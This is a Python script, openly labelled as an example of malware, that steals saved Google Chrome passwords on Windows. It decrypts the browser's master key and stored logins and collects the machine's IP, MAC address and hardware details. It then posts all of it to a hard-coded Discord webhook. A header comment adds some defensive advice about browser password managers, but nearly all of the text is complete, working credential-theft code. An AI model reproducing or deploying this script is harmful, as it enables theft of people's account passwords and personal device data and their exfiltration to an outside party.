from subprocess import check_call                           #  ─┐
import sys                                                  #   │
import os                                                   #   │
                                                            #   │
if '3.12.0' not in sys.version:                             #   │  ─┐
    sys.exit()                                              #   │  ─┼─ Checks if Python version is 3.12.0 and if not exits script
                                                            #   │  ─┘
def restart():                                              #   │  ─┐
    os.system('py TOTALLY_NOT_MALICIOUS.py')                #   │  ─┼─ Restart function restarts the script to use all libraries that were installed that were previously not installed
                                                            #   │  ─┘
packages = ['pycryptodome', 'pypiwin32', 'requests',        #   │  ─┐
           'pytz', 'getmac', 'wmi']                         #   │   │
check_call([sys.executable, '-m', 'pip', 'install'] +       #   │  ─┼─ Attempts to install packages, if found then continues script
           packages)                                        #   │   │
                                                            #   │  ─┘
try:                                                        #   │  ─┐
    import win32crypt                                       #   │   │
    import requests                                         #   │   │
    import pytz                                             #   │   │
    import wmi                                              #   │   │
                                                            #   │  ─┼─ Tries to import libraries and if module is not found then restarts script and tries again
    from getmac import get_mac_address                      #   │   │
    from Crypto.Cipher import AES                           #   │   │
                                                            #   │   │
except ModuleNotFoundError:                                 #   │   │
    restart()                                               #   │  ─┘
                                                            #   │
import sqlite3                                              #   │
import random                                               #   │
import string                                               #   │
import base64                                               #  ─┼─[IMPORTED LIBRARIES]
import shutil                                               #   │
import json                                                 #   │
import re                                                   #   │
                                                            #   │
from datetime import datetime                               #   │
                                                            #  ─┘
#############################################################
#
#   START_DATE: 10/18/2023
#   END_DATE: 10/23/2023
#   DESIGNED BY: {REDACTED}
#   CLIENT: {REDACTED}
#   SCRIPT INFORMATION:
#
#   *This is an example of a malicious script and is not intended for use towards anyone.*
#
#   Collects stored passwords in the Google Chrome web browser on the PC where script was ran then sends post request to discord integration
#   with embed formatted to display gathered content. Decrypts content with AES decryption from the files found in the Local folder where
#   web browsers are installed by default. Also collects information from the device it was ran on e.g, IP Address, MAC Address, CPU, GPU, and Total RAM.
#
#   Google Chrome stores the encrypted key for the password manager directly next to the encrypted passwords...(NOT IDEAL), to prevent yourself from
#   being attacked from malware and your content from being stolen simply don't use the password manager in Google Chrome as well as *ANY* other web
#   browser and make sure to check the software you are running on your PC using https://www.virustotal.com/ and understanding that running random files
#   can be harmful without knowledge of the contents.
#
#   Note: Virus Total does not always detect malicious software or files so do not depend on using https://www.virustotal.com/ and instead
#   learn how to view and read software safely to avoid as many issues as possible.
#
#   If you'd want to store your passwords securely, find a verified password manager provider and store your passwords in there or write them down in a journal.
#   Anything stored on a device is never 100% secure and the most secure way to store any information is to store your information physically rather than virtually.
#
#################################################################################################################################################################################
                                                                                                                                                                                #  ─┐
class Decrypt:                                                                                                                                                                  #  ─┼─ Creates class named 'Decrypt'
                                                                                                                                                                                #  ─┘
    def __init__(self):                                                                                                                                                         #  ─┐
                                                                                                                                                                                #  ─┼─ Intializes the load_config function into an object
        self.config = self.load_config()                                                                                                                                        #  ─┘
                                                                                                                                                                                #
    def load_config(self):                                                                                                                                                      #  ─┐
                                                                                                                                                                                #   │
        config = {                                                                                                                                                              #   │
            "environ": os.environ['USERPROFILE'],                                                                                                                               #   │
            "LOCAL_STATE": os.path.normpath(r'%s/AppData/Local/Google/Chrome/User Data/Local State'%(os.environ['USERPROFILE'])),                                               #   │
            "CHROME_PATH": os.path.normpath(r"%s/AppData/Local/Google/Chrome/User Data"%(os.environ['USERPROFILE'])),                                                           #   │
            "url": "",                                                                                                                                                          #  ─┼─ Function that returns a dictionary with values of paths, webhook, and empty values for later use
            "user": "",                                                                                                                                                         #   │
            "password": "",                                                                                                                                                     #   │
            "webhook": "https://discord.com/api/webhooks/1166067482193297604/QPYWvfRQy6Ks5crVnpQO6D8EdStZh8e8zyf27f7QG5HHmllEKMa1NKUP-yU5cT-PKkUp"                              #   │
        }                                                                                                                                                                       #   │
        return config                                                                                                                                                           #   │
                                                                                                                                                                                #  ─┘
    def secret(self):                                                                                                                                                           #  ─┐
                                                                                                                                                                                #   │
        try:                                                                                                                                                                    #   │
                                                                                                                                                                                #   │
            with open(self.config["LOCAL_STATE"], "r", encoding='utf-8') as f:                                                                                                  #   │
                local = f.read()                                                                                                                                                #   │
                local = json.loads(local)                                                                                                                                       #   │
                                                                                                                                                                                #  ─┼─ Function that opens path to 'Local State' file on current pc, reads and loads it, then decrypts the encrypted
            secret = base64.b64decode(local["os_crypt"]["encrypted_key"])                                                                                                       #  ─┼─ key in the file then formats it to make it able to be decoded with AES decryption then returns 'secret'
            secret = secret[5:]                                                                                                                                                 #   │
            secret = win32crypt.CryptUnprotectData(secret, None, None, None, 0)[1]                                                                                              #   │
            return secret                                                                                                                                                       #   │
                                                                                                                                                                                #   │
        except Exception:                                                                                                                                                       #   │
                                                                                                                                                                                #   │
            return None                                                                                                                                                         #  ─┘
                                                                                                                                                                                #
    def password(self, cipher, secret):                                                                                                                                         #  ─┐
                                                                                                                                                                                #   │
        try:                                                                                                                                                                    #   │
                                                                                                                                                                                #   │
            iv = cipher[3:15]                                                                                                                                                   #   │
            encrypted = cipher[15:-16]                                                                                                                                          #   │
            text = self.cipher(secret, iv)                                                                                                                                      #  ─┼─ Creates initialisation vector ('iv') and 'encrypted' that gets their value from ciphertext as an argument when the function is used.
            cipher = self.decryption(text, encrypted)                                                                                                                           #  ─┼─ calls the 'cipher' and 'decryption' function to be used then decodes the cipher and returns it as 'decrypted' variable
            decrypted = cipher.decode()                                                                                                                                         #   │
            return decrypted                                                                                                                                                    #   │
                                                                                                                                                                                #   │
        except Exception:                                                                                                                                                       #   │
                                                                                                                                                                                #   │
            return None                                                                                                                                                         #  ─┘
                                                                                                                                                                                #
    def db_connect(self, db):                                                                                                                                                   #  ─┐
                                                                                                                                                                                #   │
        try:                                                                                                                                                                    #   │
                                                                                                                                                                                #   │
            shutil.copy2(db, 'Login.db')                                                                                                                                        #  ─┼─ 'db_connect' function generates local database then connects to the database
            return sqlite3.connect('Login.db')                                                                                                                                  #   │
                                                                                                                                                                                #   │
        except Exception:                                                                                                                                                       #   │
                                                                                                                                                                                #   │
            return None                                                                                                                                                         #  ─┘
                                                                                                                                                                                #
    def decryption(self, cipher, payload):                                                                                                                                      #  ─┐
        return cipher.decrypt(payload)                                                                                                                                          #  ─┼─ Returns cipher using the 'decrypt' function with a payload parameter
                                                                                                                                                                                #  ─┘
    def cipher(self, aes, iv):                                                                                                                                                  #  ─┐
        return AES.new(aes, AES.MODE_GCM, iv)                                                                                                                                   #  ─┼─ Returns AES.new() function with parameters to decode AES format
                                                                                                                                                                                #  ─┘
    def uuid(self):                                                                                                                                                             #  ─┐
                                                                                                                                                                                #   │
        uuid = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8)) + '-'  + ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))               #  ─┼─ Creates randomized UUID for easier search for specific computers then returns 'uuid'
        return uuid                                                                                                                                                             #   │
                                                                                                                                                                                #  ─┘
    def pc_info(self):                                                                                                                                                          #  ─┐
                                                                                                                                                                                #   │
        ip = str(requests.get('https://api.ipify.org').content.decode('utf8'))                                                                                                  #   │
        mac = str(get_mac_address())                                                                                                                                            #   │
        cpu = str(wmi.WMI().Win32_Processor()[0].Name)                                                                                                                          #   │
        gpu = str(wmi.WMI().Win32_VideoController()[0].Name)                                                                                                                    #  ─┼─ Returns ip, mac, cpu, gpu, and total ram into a string format
        ram = str(round(float(wmi.WMI().Win32_OperatingSystem()[                                                                                                                #   │
                                    0].TotalVisibleMemorySize) / 1048576, 0))                                                                                                   #   │
                                                                                                                                                                                #   │
        return f'*IP Address*: ``{ip}``\n*MAC Address*: ``{mac}``\n*CPU*: ``{cpu}``\n*GPU*: ``{gpu}``\n*Total RAM*: ``{ram}``'                                                  #   │
                                                                                                                                                                                #  ─┘
    def main(self) -> None:                                                                                                                                                     #  ─┐  ─┐
                                                                                                                                                                                #   │   │
        time = datetime.now(pytz.timezone('US/Eastern'))                                                                                                                        #   │   │
        field_count = 0                                                                                                                                                         #   │   │
                                                                                                                                                                                #   │   │
        data = {                                                                                                                                                                #   │   │
            'embeds': [                                                                                                                                                         #   │   │
                    {                                                                                                                                                           #   │  ─┼─ Creates 'time' variable with datetime and pytz module, creates 'field-count' variable,
                    'title': f'``{self.config["environ"]}`` | UUID: ``{self.uuid()}``',                                                                                         #   │  ─┼─ creates 'data' into embed format to send to discord webhook then establishes 'fields' from 'data'
                    'description': f'{self.pc_info()}',                                                                                                                         #   │   │
                    'color': 0x2ecc71,                                                                                                                                          #   │   │
                    'fields': [],                                                                                                                                               #   │   │
                    'timestamp': f'{time}',                                                                                                                                     #   │   │
                }                                                                                                                                                               #   │   │
            ]                                                                                                                                                                   #   │   │                  
        }                                                                                                                                                                       #   │   │
        fields = data['embeds'][0]['fields']                                                                                                                                    #   │  ─┘
                                                                                                                                                                                #   │
        try:                                                                                                                                                                    #   │  ─┐
                                                                                                                                                                                #   │   │
            secret_key = self.secret()                                                                                                                                          #   │   │
            folders = [element for element in os.listdir(self.config['CHROME_PATH']) if re.search('^Profile*|^Default$', element) != None]                                      #   │   │
                                                                                                                                                                                #   │   │
            for folder in folders:                                                                                                                                              #   │   │
                                                                                                                                                                                #   │   │
                chrome_path = os.path.normpath(r"%s/%s/Login Data"%(self.config['CHROME_PATH'],folder))                                                                         #   │  ─┼─ Tries to generate secret with secret function then searches for elements in 'User Data' folder then generates format
                conn = self.db_connect(chrome_path)                                                                                                                             #   │  ─┼─ for the data going in the database then creates cursor and connection to database then posts data
                                                                                                                                                                                #   │   │
                if(secret_key and conn):                                                                                                                                        #   │   │
                                                                                                                                                                                #   │   │
                    cursor = conn.cursor()                                                                                                                                      #   │   │
                    cursor.execute('SELECT action_url, username_value, password_value FROM logins')                                                                             #   │   │
                                                                                                                                                                                #   │  ─┘
                    for i, login in enumerate(cursor.fetchall()):                                                                                                               #   │  ─┐
                                                                                                                                                                                #   │   │
                        field_count = 0                                                                                                                                         #   │   │
                        if field_count == 17:                                                                                                                                   #   │   │
                                                                                                                                                                                #   │   │
                            self.config['url'] = login[0]                                                                                                                       #   │   │
                            self.config['username'] = login[1]                                                                                                                  #   │   │
                            cipher = login[2]                                                                                                                                   #   │   │
                                                                                                                                                                                #   │   │
                            if(self.config['url'] != '' and                                                                                                                     #   │   │
                            self.config['username'] != '' and                                                                                                                   #   │   │
                            cipher != ''):                                                                                                                                      #   │   │
                                                                                                                                                                                #   │   │
                                self.config['password'] = self.password(cipher, secret_key)                                                                                     #   │   │
                                                                                                                                                                                #   │   │
                                temp_dict = {                                                                                                                                   #   │   │
                                                                                                                                                                                #   │   │
                                    'name': f'website: ``{self.config["url"]}``',                                                                                               #   │   │
                                    'value': f'__*user*__: ``{self.config["username"]}``\n__*pass*__: ``{self.config["password"]}``',                                           #   │   │
                                    'inline': True                                                                                                                              #   │   │
                                                                                                                                                                                #   │   │
                                }                                                                                                                                               #   │   │
                                fields.append(temp_dict)                                                                                                                        #   │   │
                                                                                                                                                                                #   │   │
                            requests.post(self.config['webhook'], json=data)                                                                                                    #   │  ─┼─ Creates for loop enumerating all indexes in database then uses if else statement to create field for discord webhook embed
                            field_count = 0                                                                                                                                     #   │  ─┼─ then uses 'password()' function to decrypt password for the 'password' in the index and then appends temp_dict to 'fields' list
                                                                                                                                                                                #   │  ─┼─ then would send webhook and reset field_count if field count = 17 since each loop += 1 to field_count to prevent going over limit
                        else:                                                                                                                                                   #   │   │
                                                                                                                                                                                #   │   │
                            field_count += 1                                                                                                                                    #   │   │
                            self.config['url'] = login[0]                                                                                                                       #   │   │
                            self.config['username'] = login[1]                                                                                                                  #   │   │
                            cipher = login[2]                                                                                                                                   #   │   │
                                                                                                                                                                                #   │   │
                            if(self.config['url'] != '' and                                                                                                                     #   │   │
                            self.config['username'] != '' and                                                                                                                   #   │   │
                            cipher != ''):                                                                                                                                      #   │   │
                                                                                                                                                                                #   │   │
                                self.config['password'] = self.password(cipher, secret_key)                                                                                     #   │   │
                                                                                                                                                                                #   │   │
                                temp_dict = {                                                                                                                                   #   │   │
                                                                                                                                                                                #   │   │
                                    'name': f'website: ``{self.config["url"]}``',                                                                                               #   │   │
                                    'value': f'*user*: ``{self.config["username"]}``\n*pass*: ``{self.config["password"]}``',                                                   #   │   │
                                    'inline': True                                                                                                                              #   │   │
                                                                                                                                                                                #   │   │
                                }                                                                                                                                               #   │   │
                                fields.append(temp_dict)                                                                                                                        #   │   │
                                                                                                                                                                                #   │   │
        except Exception:                                                                                                                                                       #   │   │
                                                                                                                                                                                #   │   │
            return None                                                                                                                                                         #   │  ─┘
                                                                                                                                                                                #   │  ─┐
        finally:                                                                                                                                                                #   │   │
                                                                                                                                                                                #   │   │
            cursor.close()                                                                                                                                                      #   │  ─┼─ After the for loop ends this closes the cursor and connection to local generated database then removes the database,
            conn.close()                                                                                                                                                        #   │  ─┼─ then sends the webhook using post in requests module passing 'data' in 'json' parameter
            os.remove("Login.db")                                                                                                                                               #   │   │
                                                                                                                                                                                #   │   │
            requests.post(self.config["webhook"], json=data)                                                                                                                    #  ─┘  ─┘
                                                                                                                                                                                #  ─┐
if __name__ == '__main__':                                                                                                                                                      #   │
                                                                                                                                                                                #  ─┼─ Makes sure script is ran as a script and not imported as module, then creates 'Decrypt' class as an object then runs main() function from class object
    decrypt = Decrypt()                                                                                                                                                         #   │
    decrypt.main()                                                                                                                                                              #  ─┘